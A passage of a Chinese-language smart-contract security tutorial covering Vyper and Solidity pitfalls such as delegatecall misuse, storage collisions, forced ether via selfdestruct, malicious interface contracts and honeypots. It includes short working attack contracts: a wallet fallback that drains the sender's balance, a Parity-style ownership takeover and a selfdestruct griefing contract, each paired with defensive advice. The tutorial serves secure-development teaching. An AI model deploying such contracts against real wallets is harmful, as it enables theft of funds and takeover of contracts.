<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface UserWallet:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">transferTo</span>(<span class="params">dest: address, amount: uint256</span>): nonpayable</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__default__</span>(): payable</span><br><span class="line"></span><br><span class="line">owner: address</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>():</span><br><span class="line">    self.owner = msg.sender</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__default__</span>():</span><br><span class="line">    UserWallet(msg.sender).transferTo(self.owner, msg.sender.balance)</span><br></pre></td></tr></table></figure>
<p>当你向这个钱包合约进行转账时，它将偷偷转移你钱包里所有的余额。</p>
<h3 id="清除映射">清除映射</h3>
<p>无论是 Vyper 的 <code>HashMap</code> 还是 Solidity 的
<code>mapping</code>，它们都是一种依赖于以太坊存储的数据结构，二者默认均不提供遍历功能，即并不会帮助记录键的内容。</p>
<p>所以在开发中需要注意，<code>HashMap</code> 或者 <code>mapping</code>
的内容将不会因为变量自身存储槽位的覆盖而清除远在他方的键值变量。</p>
<blockquote>
<p>详细可以参考<strong>隐私性</strong>中的<strong>映射类型</strong>。</p>
</blockquote>
<p>由于 Vyper 暂时不支持用 <code>HashMap</code> 作为
<code>DynArray</code> 的类型，故这里以 Solidity 为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &lt;0.8.0;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    mapping (string =&gt; uint256)[] statusList;</span><br><span class="line"></span><br><span class="line">    function push() external &#123;</span><br><span class="line">        // 在数组末尾新增一个mapping</span><br><span class="line">        statusList.push();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() external &#123;</span><br><span class="line">        // 删除一个数组末尾的mapping</span><br><span class="line">        statusList.pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getStatus(uint256 idx, string memory key) external view returns (uint256) &#123;</span><br><span class="line">        // 根据索引和key获取状态</span><br><span class="line">        require(idx &lt; statusList.length, &quot;Index should less than length&quot;);</span><br><span class="line">        return statusList[idx][key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setStatus(uint256 idx, string memory key, uint256 status) external  &#123;</span><br><span class="line">        // 根据索引和key设置状态</span><br><span class="line">        require(idx &lt; statusList.length, &quot;Index should less than length&quot;);</span><br><span class="line">        statusList[idx][key] = status;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们首先 <code>push</code>，得到一个新的 <code>mapping</code>，然后
<code>setStatus</code>，例如参数为
<code>0,"qsdz",12345</code>，此时可以通过 <code>getStatus</code>
查看到键值对成功写入存储。</p>
<p>然后 <code>pop</code> 再
<code>push</code>，这在普通计算机平台上理应键值对就被清除了，但实际上在以太坊中，映射类型相当于永久存储，此时再次通过
<code>getStatus</code> 还是可以获取到刚才写入存储的键值对。</p>
<p>为了防止映射值被重复利用，建议在删除映射的同时清除映射，不过这需要额外的存储保存映射的所有键。</p>
<p>Solidity 在 GitHub 上收录了一些比较实用的 <a target="_blank" rel="noopener" href="https://github.com/ethereum/dapp-bin/tree/master/library">library</a>，其中就包括了
<code>IterableMapping</code>，也可以自定义一个更适配的映射来清除映射。</p>
<h3 id="位数据隐匿">位数据隐匿</h3>
<p>没有完全占满 32
字节的类型可能会包含<strong>脏高位</strong>，尤其是存在于
<code>msg.data</code> 中的数据，既可以使用 <code>0xff000001</code>
也可以使用 <code>0x00000001</code> 作为 <code>msg.data</code> 提供给函数
<code>f(uint8 x)</code>。</p>
<p>作为 <code>calldata</code> 数据，在处理后得到的 <code>x</code>
值将是相同的，但是这在 <code>msg.data</code> 中是不同的。</p>
<p>所以尽量避免直接操作 <code>msg.data</code>，例如说
<code>keccak256(msg.data)</code>，这可能会有一定的风险存在。</p>
<blockquote>
<p>如果使用 ABI 编码器的 v2
版本将会进行一定的健全性检查，防止脏高位的产生，但是可能需要额外支出一定的
gas。</p>
<p>Solidity 0.8.0 以后版本和 Vyper 默认使用 v2 版本的 ABI 编码器。</p>
</blockquote>
<h3 id="委托调用">委托调用</h3>
<p><code>call</code> 和 <code>delegatecall</code> 都是 Solidity
的低级函数，在 EVM 中有直接对应操作的字节码。</p>
<p><code>call</code>
用于合约与合约进行交互，正常调用合约代码时就会被翻译成 <code>call</code>
函数，通常用于直接调用其他合约的 <code>fallback</code> 函数；</p>
<p><code>delegatecall</code>
用于合约复用其他合约代码，<code>msg.sender</code>、<code>msg.value</code>
和 <code>storage</code>
都将继承自当前合约，正如其名<strong>委托调用</strong>，被调用者也会被称作代理（Proxy）。</p>
<p>二者的 revert
都不会冒泡；类型检查将被绕过；函数存在性检查将被忽略。</p>
<p>所以为安全起见不建议直接使用这两个低级函数调用合约函数。</p>
<p>相比较 <code>call</code> 的危险性，<code>delegatecall</code>
的危险性更高，最直接的就是 <code>delegatecall</code> 会继承
<code>msg.sender</code>，使得身份验证
<code>require(msg.sender, owner)</code> 失效。</p>
<p>为了提高代码复用性，增强代码可升级性和节省 gas，故通常使用
<code>delegatecall</code> 利用<strong>代理合约</strong>（Proxy
Contract）的代码，比如说这么一个钱包代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract UserWalletLibrary &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function initWallet() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UserWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    UserWalletLibrary lib;</span><br><span class="line"></span><br><span class="line">    constructor(UserWalletLibrary _lib) &#123;</span><br><span class="line">        lib = _lib;</span><br><span class="line">        (bool success, ) = address(lib).delegatecall(abi.encodeWithSignature(&quot;initWallet()&quot;));</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        (bool success, ) = address(lib).delegatecall(msg.data);</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样通过 <code>UserWalletLibrary</code> 的 <code>delegatecall</code>
调用以达到合约代码的复用性，同时在需要更新功能的时候，仅需更新并部署
<code>UserWalletLibrary</code> 合约即可，新的钱包直接重设
<code>lib</code> 变量可以达到与热更新类似的效果。</p>
<p>在这里需要保证 <code>UserWalletLibrary</code> 与
<code>UserWallet</code>
的存储结构保持一致，否则可能会导致插槽访问错误。</p>
<blockquote>
<p>故对于复杂存储结构的合约可能会有更高的库合约维护难度。</p>
</blockquote>
<p>一切看起来都十分美好，但是在这里错误将 <code>initWallet</code>
变得可复用，导致外部合约可以重复调用该函数，使得钱包易主，这也是著名的
Parity Hack 攻击。</p>
<blockquote>
<p>在这里需要有一个良好的开发习惯，不可复用的代码不应该写在库合约（代理合约）中。</p>
</blockquote>
<p>我们可以写出攻击代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    function attack(address victim) external &#123;</span><br><span class="line">        (bool success, ) = victim.call(abi.encodeWithSignature(&quot;initWallet()&quot;));</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将钱包合约地址填入进行攻击，钱包便直接易主。</p>
<p>所以开发时<strong>不要滥用</strong>
<code>delegatecall</code>，如果无可避免，那么在库合约中<strong>禁止出现不可复用的代码</strong>。</p>
<p>延续上文，<code>delegatecall</code>
还可能产生一个开发错误，就是上下文合约中的存储结构不一致的问题。</p>
<p>因为这是合约而不是库，合约是会被编译成字节码的，部署后将不会发生改变，那么合约访问状态变量是被硬编码为插槽位置写死在代码里的。</p>
<p><strong>那没办法嘛，代码是这样写的</strong>。</p>
<p>当存储结构不一致时，使用 <code>delegatecall</code>
后的合约代码只知道自己要访问哪个<strong>插槽</strong>，而不知道自己要访问哪个变量。</p>
<p>比如说可能会有以下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract UserWalletLibrary &#123;</span><br><span class="line">    uint256 status;</span><br><span class="line"></span><br><span class="line">    function saveStatus(uint256 _status) public &#123;</span><br><span class="line">        if (_status != 0) &#123;</span><br><span class="line">            status = _status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UserWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 status;</span><br><span class="line">    address lib;</span><br><span class="line"></span><br><span class="line">    constructor(address _lib) &#123;</span><br><span class="line">        lib = _lib;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function saveStatus(uint256 _status) external &#123;</span><br><span class="line">        (bool success, ) = lib.delegatecall(abi.encodeWithSignature(&quot;saveStatus(uint256)&quot;, _status));</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于 <code>UserWalletLibrary</code> 中 <code>status</code> 在插槽索引
0 处，而 <code>UserWallet</code> 中 <code>owner</code> 也在插槽索引 0
处，故 <code>UserWallet.saveStatus</code> 将修改 <code>owner</code>
而不是 <code>status</code>。</p>
<p>故这种编程方式是不推荐的，更推荐用结构体来保证上下文存储结构的一致性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">struct UserWalletData &#123;</span><br><span class="line">    address lib;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UserWalletLibrary &#123;</span><br><span class="line">    UserWalletData data;</span><br><span class="line"></span><br><span class="line">    function saveStatus(uint256 _status) public &#123;</span><br><span class="line">        if (_status != 0) &#123;</span><br><span class="line">            data.status = _status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UserWallet &#123;</span><br><span class="line">    UserWalletData public data;</span><br><span class="line"></span><br><span class="line">    constructor(address _lib) &#123;</span><br><span class="line">        data.lib = _lib;</span><br><span class="line">        data.owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function saveStatus(uint256 _status) external &#123;</span><br><span class="line">        (bool success, ) = data.lib.delegatecall(abi.encodeWithSignature(&quot;saveStatus(uint256)&quot;, _status));</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而使用结构体的好处就在于，此时可以使用库进行编程来优化代码，这也是官方推荐的做法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">struct UserWalletData &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library UserWalletLibrary &#123;</span><br><span class="line">    function saveStatus(UserWalletData storage self, uint256 _status) public &#123;</span><br><span class="line">        if (_status != 0) &#123;</span><br><span class="line">            self.status = _status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract UserWallet &#123;</span><br><span class="line">    UserWalletData public data;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        data.owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function saveStatus(uint256 _status) external &#123;</span><br><span class="line">        // 不需要库的特定实例就可以调用库函数，</span><br><span class="line">        // 因为当前合约就是 “instance”。</span><br><span class="line">        UserWalletLibrary.saveStatus(data, _status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用时必须记住两件事：</p>
<ol type="1">
<li><code>delegatecall</code> 保留上下文（存储、调用者等）</li>
<li><code>delegatecall</code>
调用合约和被调用合约的存储结构必须一致</li>
</ol>
<h3 id="天降横财">天降横财</h3>
<p>一个没有 <code>receive</code>、<code>fallback</code> 和其他
<code>payable</code> 函数的合约可能收到 ether 吗？</p>
<p>答案是可能的。</p>
<p>以太坊开发组认为开发者不能盲目相信 <code>balance</code>
的不变性，它实际上极易发生改变，如果需要，最好通过一个状态变量保存合约应该收到了多少
ether。</p>
<h4 id="selfdestruct">selfdestruct</h4>
<p><code>selfdestruct</code>
是被设计用于销毁当前合约，为以太坊节省存储空间，防止合约被重复利用的低级函数，它将直接触发
EVM 的 <code>SELFDESTRUCT</code> 字节码。</p>
<blockquote>
<p>在 Solidity 的 0.5.0 版本之前是 <code>suicide</code>。</p>
</blockquote>
<p>极其重要的特点是<strong>它会转移资金但不会触发接收函数</strong>（<code>receive</code>
和 <code>fallback</code>）。</p>
<p>不过需要注意，合约只有在交易结束并被区块链接受后才真正被销毁，revert
会恢复其未被销毁的状态。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-6780">EIP-6780</a>
更改了操作码 <code>SELFDESTRUCT</code>
的功能，只有在创建合约的同一个交易中调用时才会销毁合约代码，否则只有转移资金的操作。</p>
</blockquote>
<p><code>selfdestruct</code>
的确是危险的，因为它可以随意操作其他合约的余额。</p>
<p>例如说一个运气赌博游戏</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">target: constant(uint256) = as_wei_value(<span class="number">7</span>, <span class="string">&quot;ether&quot;</span>)</span><br><span class="line">winner: public(address)</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@pure</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target</span>() -&gt; uint256:</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">assert</span> msg.value == as_wei_value(<span class="number">1</span>, <span class="string">&quot;ether&quot;</span>), <span class="string">&quot;Only send 1 ether&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> self.balance &lt;= target, <span class="string">&quot;Game over&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.balance == target:</span><br><span class="line">        self.winner = msg.sender</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reward</span>():</span><br><span class="line">    <span class="keyword">assert</span> msg.sender == self.winner, <span class="string">&quot;Not winner&quot;</span></span><br><span class="line">    self.winner = empty(address)</span><br><span class="line">    send(msg.sender, self.balance, gas=msg.gas)</span><br></pre></td></tr></table></figure>
<p>规则是每个人每次可以发送 1 ether 给合约，第七个给合约发送 ether
的人将成为胜利者，拿取其他人的 ether。</p>
<p>这很好，以小博大，但是如果此时有恶意破坏者，不想游戏进行下去，它可以通过
<code>selfdestruct</code> 发送非 1 ether 的整数倍的余额到合约中，例如 1
wei，这将使得游戏无法正确进行，始终没有赢家。</p>
<p>一个简单的攻击合约</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">victim: address</span>):</span><br><span class="line">    <span class="keyword">assert</span> msg.value &gt; <span class="number">0</span>, <span class="string">&quot;No value&quot;</span></span><br><span class="line">    selfdestruct(victim)</span><br></pre></td></tr></table></figure>
<h4 id="预导入">预导入</h4>
<p>也许未来 <code>selfdestruct</code>
将发生改变，上述破坏行为不可使用，那么还有一种方式就是预先计算合约的地址，随后在部署合约前向该地址发送
ether，当合约真正被创建时，合约就会有一个非零的 ether 余额。</p>
<p>针对于默认的合约创建模式（<code>create</code>
字节码），其合约地址的计算代码如下，<code>address</code> 是
<code>tx.origin</code>，<code>nonce</code> 是创建者总共的交易次数。</p>
<p>以下是 TypeScript 的计算代码</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="variable constant_">RLP</span> <span class="keyword">from</span> <span class="string">&quot;rlp&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Web3</span> <span class="keyword">from</span> <span class="string">&quot;web3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> address = <span class="string">&quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;</span></span><br><span class="line"><span class="keyword">const</span> nonce = <span class="number">0</span></span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">&quot;0x&quot;</span> + <span class="title class_">Web3</span>.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="variable constant_">RLP</span>.<span class="title function_">encode</span>([address, nonce])).<span class="title function_">substring</span>(<span class="number">26</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(contractAddress)</span><br></pre></td></tr></table></figure>
<p>以下是 Python 的计算代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> keccak</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"></span><br><span class="line">address = <span class="string">&quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;</span></span><br><span class="line">nonce = <span class="number">0</span></span><br><span class="line">address = <span class="built_in">int</span>(address, <span class="number">16</span>).to_bytes(<span class="number">20</span>)</span><br><span class="line">encoded = rlp.encode([address, nonce])</span><br><span class="line">contract_address = <span class="string">&quot;0x&quot;</span> + keccak.new(data=encoded, digest_bytes=<span class="number">32</span>).hexdigest()[-<span class="number">40</span>:]</span><br><span class="line"><span class="built_in">print</span>(contract_address)</span><br></pre></td></tr></table></figure>
<p>有关 <code>create2</code> 字节码的地址计算可以参考网络。</p>
<h3 id="看不见的代码">看不见的代码</h3>
<p>智能合约可能由不同的编程语言编写而成。为了确保合约之间能够互相交互，<strong>接口</strong>（Interface）是至关重要的。</p>
<p>只要合约满足接口的规范，无论它们是由哪种编程语言编写，并且无论编译出的字节码的大小如何，它们就可以交互。</p>
<blockquote>
<p>如果是以太坊外部需要与合约交互，这个接口是 ABI（Application Binary
Interface）。</p>
</blockquote>
<p>如果说开发者需要从外部获取地址，再通过接口调用地址上的代码，那么很有可能得到的地址是满足接口的恶意合约地址。</p>
<p>比如说一个简单的猜数游戏，需要从外部（预言机）获取随机数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface Lib:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getRandomNumber</span>() -&gt; uint256: nonpayable</span><br><span class="line"></span><br><span class="line">target: uint256</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">addr: address</span>):</span><br><span class="line">    <span class="keyword">assert</span> self.target == <span class="number">0</span>, <span class="string">&quot;Game has started&quot;</span></span><br><span class="line">    self.target = Lib(addr).getRandomNumber()</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">num: uint256</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">assert</span> self.target != <span class="number">0</span>, <span class="string">&quot;Game does not start&quot;</span></span><br><span class="line">    <span class="keyword">if</span> num == self.target:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果说我编写恶意的，满足接口的合约</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRandomNumber</span>() -&gt; uint256:</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>部署后将合约地址传递给 <code>start</code>
函数，那么每次游戏我仅需要猜 5 即可获胜。</p>
<p>恶意代码在主合约中是不可见的，你根本不知道主合约调用了恶意代码。</p>
<p>所以一般建议非信任地址不要轻易调用，建议在初始化时便定死被调用合约地址，在修改时加上身份验证。</p>
<h3 id="蜜罐">蜜罐</h3>
<p>利用上文<strong>看不见的代码</strong>，我们可以制作蜜罐陷阱欺骗攻击者，使得攻击者损失。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface Logger:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logging</span>(<span class="params">beneficiary: address, amount: uint256</span>): nonpayable</span><br><span class="line"></span><br><span class="line">logger: Logger</span><br><span class="line">balances: public(HashMap[address, uint256])</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">logger: address</span>):</span><br><span class="line">    self.logger = Logger(logger)</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="meta">@payable</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deposit</span>():</span><br><span class="line">    self.balances[msg.sender] += msg.value</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">withdraw</span>():</span><br><span class="line">    amount: uint256 = self.balances[msg.sender]</span><br><span class="line">    <span class="keyword">assert</span> amount &gt; <span class="number">0</span>, <span class="string">&quot;No balance&quot;</span></span><br><span class="line">    send(msg.sender, amount, 